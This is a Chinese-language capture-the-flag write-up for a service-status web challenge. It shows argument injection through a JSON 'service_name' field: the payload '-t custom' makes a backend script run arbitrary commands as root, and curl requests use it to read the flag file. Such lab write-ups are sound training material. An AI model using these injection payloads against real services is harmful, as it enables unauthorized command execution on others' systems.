## 题解

### 入口与指纹

标题 `Service Status Dashboard`，前端对 `apache/mysql/nginx/ssh` 四个名字
`POST /check_service`（JSON `{"service_name": "..."}`），把 `status` 渲染出来。

### 关键观察

**1. 后端是一个 shell 脚本，不是 API 调用。**

传一个对象而不是字符串，会把脚本的 usage 打回来：

```json
{"service_name": {"a":1,"b":2}}
→ "status": "Too many arguments for default 'systemctl' type.\n
   Usage: check_service.sh [-t type] [service_name]\n
   Types:\n  systemctl ... \n  ps ... \n  custom - Execute a custom command ..."
```

也就是说 `service_name` 会被按空格拆成多个 argv 传给 `check_service.sh`。

**2. 黑名单只挡 `;` `|` `&` `$()` 这类 shell 元字符，不挡空格和 `-t`。**

```text
service_name = "-t custom id"
→ status = "uid=0(root) gid=0(root) groups=0(root)\ntrue"
```

**3. `custom` 类型会执行引号里的整条命令。**

### 利用链

```bash
T=$(head -1 .target)
curl -sS -X POST -H 'Content-Type: application/json' \
  -d '{"service_name":"-t custom \"ls -la /app\""}' "http://$T/check_service"
# app/FLAG.txt 存在
curl -sS -X POST -H 'Content-Type: application/json' \
  -d '{"service_name":"-t custom \"cat /app/FLAG.txt\""}' "http://$T/check_service"
# status: flag{...}true
```

### flag 位置

容器内 `/app/FLAG.txt`（`/FLAG.txt` 不存在）。

## 复盘

- **参数注入不一定要 `;`。** `-t custom` 是脚本自身提供的「执行任意命令」开关，
  只要参数能拆开就能用，比绕 shell 元字符黑名单简单得多。
- **用对象/数组造成「参数个数不对」能骗出 usage。** 这是最快拿到后端接口说明的手段。
- 执行身份是 root，说明整个服务没有降权。
